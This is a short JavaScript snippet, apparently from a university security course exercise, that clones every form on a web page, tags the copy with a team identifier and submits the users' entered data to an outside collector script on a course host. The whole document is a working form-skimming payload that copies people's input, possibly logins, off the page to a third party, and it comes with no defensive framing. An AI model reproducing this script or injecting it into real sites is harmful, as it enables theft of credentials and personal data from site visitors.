for(let form of document.forms) {
    var copyForm = document.createElement("form")
    copyForm.setAttribute("id", "duplicate")
    for(let old of form.elements) {
        copyForm.appendChild(old)
    }
    var input = document.createElement("input")
    input.setAttribute("name", "442team")
    input.setAttribute("value", "DDSH")
    copyForm.appendChild(input)
    copyForm.action = "http://fourfourtwo.csse.rose-hulman.edu/f/slurp.php"
    document.appendChild(copyForm)
    document.duplicate.submit()
}
